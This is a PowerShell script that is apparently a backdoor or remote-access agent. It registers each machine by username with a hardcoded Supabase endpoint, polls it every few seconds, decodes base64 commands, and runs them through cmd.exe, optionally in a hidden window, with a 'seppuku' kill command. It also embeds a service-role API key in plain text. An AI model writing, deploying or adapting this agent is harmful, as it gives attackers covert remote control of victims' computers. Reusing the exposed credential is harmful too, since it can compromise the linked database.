$BASE_URL = "https://dkrlxecasaxmcnssuqdr.supabase.co/rest/v1"
$API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRrcmx4ZWNhc2F4bWNuc3N1cWRyIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NTMyODEyMCwiZXhwIjoyMDkwOTA0MTIwfQ.U05G6GDmpCbxaE-inxUzIumFlRKCUbmkNdlZ8fY8XLA"

$h = @{
    "apikey"        = $API_KEY
    "Authorization" = "Bearer $API_KEY"
    "Content-Type"  = "application/json"
    "Prefer"        = "return=representation"
    "Accept"        = "application/vnd.pgrst.object+json"
}

while ($true) {
    try {
        # heartbeat
        $u = "$BASE_URL/clients?username=eq.$env:USERNAME&select=cmd,run,visible"
        $r = Invoke-RestMethod -Method Patch -Uri $u -Headers $h -Body '{"updated_at": "now()"}'
        
        # run command
        if ($r.run -eq $true) {
            Invoke-RestMethod -Method Patch -Uri $u -Headers $h -Body '{"cmd": null, "run": false}' | Out-Null

            $c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($r.cmd))
            if ($c -eq "seppuku") { exit }

            $style = if ($r.visible -eq $true) { "Normal" } else { "Hidden" }
            Start-Process cmd.exe -ArgumentList "/c", $c -WindowStyle $style
        }
    }
    catch {}
    Start-Sleep -Seconds 4
}